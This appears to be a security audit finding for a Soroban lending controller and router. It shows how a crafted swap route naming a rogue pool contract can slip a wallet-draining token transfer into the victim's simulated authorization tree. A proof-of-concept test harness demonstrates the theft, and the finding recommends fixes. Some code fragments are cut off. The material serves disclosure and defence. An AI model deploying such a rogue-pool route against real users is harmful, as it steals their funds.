### Title
Unrestricted external resolution of attacker-supplied route bytes lets a rogue venue execute arbitrary calls beneath the caller's authorization tree - ([File: contracts/controller/src/strategies/swap.rs])

### Summary
Analogous to the FreeCAD XXE — an XML parser resolving attacker-controlled external references to reach resources beyond the intended document — the controller's strategy verbs resolve an attacker-influenced `swap: StrategySwap` payload into arbitrary cross-contract invocations without restricting which contracts the payload may name. `swap_tokens` forwards the raw bytes verbatim to the configured router (`router.execute_strategy(&controller, &amount_in, swap)` at `contracts/controller/src/strategies/swap.rs:37`); the router keeps no allowlist of the pool and token addresses the payload names, so a hop executes arbitrary third-party code on the call stack that descends from the caller's `require_auth` entry on `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, or `multiply`. The harness test `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs` proves the consequence: a rogue hop pool's `token.transfer(victim, attacker, wallet_balance)` is recorded by simulation as a child of the victim's `swap_collateral` auth entry, and executes if the victim signs the simulated tree — draining the victim's unrelated wallet tokens, unbounded by the routed amount, the payload's `min_out`, or the final account risk gate. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`swap_tokens` authenticates only one thing — a single exact-amount input transfer from the controller to the router via `authorize_transfer_as_current` — and measures only two things: `RouterOverspend` on input and `NoSwapOutput` on output. Neither control constrains which contracts the payload resolves during execution (the direct analogue of an XML parser with external entities and DTD loading left enabled). A crafted `StrategySwap` names an attacker-deployed contract as a hop `pool`; when the router invokes it, that contract calls `token.transfer(victim, attacker, x)` on any token the victim holds. Because the pool call sits below the controller invocation the victim authorized, the host attaches the transfer to the victim's auth entry during simulation, and the transaction succeeds once the victim signs the tree the simulator produced — exactly what standard wallet/dapp signing flows do with simulated authorization. [4](#0-3) [5](#0-4) 

### Impact Explanation
Theft of user funds: tokens in the victim's wallet that the protocol never listed are transferred to the attacker, bounded only by the victim's balances and what the signed auth tree contains — not by the routed amount or any slippage/risk gate, as the threat model itself states ("The loss is then the caller's wallet, not the routed amount"). The swap itself still settles correctly (fair output, position stays healthy), so nothing on-chain looks anomalous. [6](#0-5) 

### Likelihood Explanation
The attacker needs the victim to submit a transaction carrying the malicious `swap_xdr` — e.g., via a malicious/compromised quote, a lookalike route, or social engineering — and to sign the simulated auth tree without decoding it. The threat model documents that mitigation is left to clients ("A client must decode the route it signs and refuse an authorization tree with any other child"), which is precisely the gap: honest simulation records the poisoned child, and default tooling signs what simulation returns. The attacker's only cost is deploying a pool contract; no privileged role, timing, or market condition is needed. This matches a Medium-severity, user-interaction-required class (the source CVE is UI:R / 6.1). [7](#0-6) [8](#0-7) 

### Recommendation
Disable the "external entity" equivalent: bound which contracts a strategy payload may resolve. Options, in decreasing strength: (1) maintain a governance-approved venue allowlist keyed by the opcodes the router can dispatch, and have the router reject hops to unlisted pools; (2) for pool-pulling venues, restrict the auth surface so venue code can never issue `require_auth`-gated calls against the transaction sender — e.g., have the controller/router enforce that no auth-bearing sub-invocation other than the single pre-authorized input transfer may name the caller as `from`; (3) at minimum, after `execute_strategy` returns, verify that no authorization entry beneath the caller's invocation performs an action outside the declared route (host-level checks are limited today, so venue allowlisting is the reliable fix). Until then, the documented client-side auth-tree inspection must ship in the official SDK route builders. [9](#0-8) 

### Proof of Concept
A working end-to-end reproduction already exists as `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`:

1. Attacker deploys `RogueHopPool` (lines 51–72): on `swap()` it calls `token.transfer(victim, attacker, amount)` on an arbitrary wallet token.
2. Attacker crafts a `RoutedSwap` payload naming that contract as `hop_pool`, with honest `token_in`/`token_out`/`min_out` (lines 111–125).
3. Victim calls `swap_collateral(alice, account_id, USDC, 5_000 USDC, ETH, route)`. Simulation (recording mode) succeeds: `simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry` asserts the recorded auth tree has the stolen `transfer(alice → attacker, 77_770_000_000)` nested under Alice's `swap_collateral` root, Alice's wallet is drained to 0, and her position still receives the full fair ETH output (lines 194–227).
4. `enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer` confirms enforcing mode executes the theft iff the victim signs the poisoned tree (lines 229–269).

fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);

#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))

    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);

That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization

entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.

## Authorization model

The only signature is the sender's. `execute_strategy` calls `sender.require_auth()`, and the sender's auth entry must cover the nested `token_in.transfer(sender, router, total_in)`; simulation produces that tree (`transaction.simulated = true` envelopes already carry it — `attach_simulated_transaction` copies the simulator's `auth` into the op — and `simulateTransaction` produces it for a locally built one). Do **not** `transfer` or `approve` tokens to the router beforehand: the router pulls the input itself, and tokens sent ahead of time are not credited.

Every venue call is self-authorized by the router with invoker-contract auth (`venues/auth.rs::authorize_as_current` → `env.authorize_as_current_contract`): Phoenix and Sushi (`HopContext::authorize_pool_pull`) and Aquarius (`aquarius/pool.rs::invoke_pool_swap`) register `token_in.transfer(router, pool, amount_in)` before the pool pulls; Comet registers `token_in.approve(router, pool, amount_in, expiry)`, then `swap_exact_amount_in` with a nested entry for the pool's `transfer_from`, then clears the allowance; Soroswap transfers from the router to the pool directly. None of these appear in the sender's auth tree.

A contract calling the router (the lending controller in `contracts/controller/src/strategies/swap.rs`, or your own) is the `sender`: it runs `authorize_transfer_as_current(token_in, self, router, amount_in)` (`common/src/token.rs`) immediately before `execute_strategy(self, amount_in, swap)` and measures its own balance deltas afterward (`RouterOverspend = 501`, `NoSwapOutput = 502` in `common/src/errors.rs`). Details in [composition.md](composition.md).
